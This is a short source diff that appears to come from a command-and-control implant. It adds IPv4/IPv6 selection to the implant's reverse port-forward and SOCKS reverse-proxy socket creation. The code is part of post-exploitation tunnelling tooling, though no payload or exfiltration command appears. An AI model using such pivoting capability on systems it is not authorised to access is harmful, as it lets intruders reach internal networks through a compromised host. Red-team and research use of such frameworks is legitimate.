@@ -2742,7 +2742,7 @@ VOID CommandSocket( PPARSER Parser )
             FwdPort = ParserGetInt32( Parser );
 
             /* Create a reverse port forward socket and insert it into the linked list. */
-            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
+            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, TRUE, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
 
             /* if Socket is not NULL then we managed to start a socket. */
             PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2908,6 +2908,7 @@ VOID CommandSocket( PPARSER Parser )
             BYTE   ATYP       = 0;
             UINT32 HostIpSize = 0;
             PBYTE  HostIp     = NULL;
+            BOOL   UseIpv4    = TRUE;
             DWORD  IPv4       = 0;
             PBYTE  IPv6       = NULL;
             INT16  Port       = 0;
@@ -2942,7 +2943,8 @@ VOID CommandSocket( PPARSER Parser )
                 // if the domain does not have an IPv4, try with IPv6
                 if ( ! IPv4 )
                 {
-                    IPv6 = DnsQueryIPv6( (LPSTR)Domain );
+                    IPv6    = DnsQueryIPv6( (LPSTR)Domain );
+                    UseIpv4 = FALSE;
                 }
 
                 Instance.Win32.LocalFree( Domain );
@@ -2950,8 +2952,9 @@ VOID CommandSocket( PPARSER Parser )
             else if ( ATYP == 4 )
             {
                 // IPv6
-                IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );
+                IPv6    = Instance.Win32.LocalAlloc( LPTR, 16 );
                 MemCopy( IPv6, HostIp, 16 );
+                UseIpv4 = FALSE;
             }
 
             PRINTF( "Socket ID: %x\n", ScId )
@@ -2960,7 +2963,7 @@ VOID CommandSocket( PPARSER Parser )
             if ( IPv4 || IPv6 )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
-                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
+                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, UseIpv4, IPv4, IPv6, Port, 0, 0 ) ) )
                 {
                     Socket->ID = ScId;
                     ErrorCode = 0;
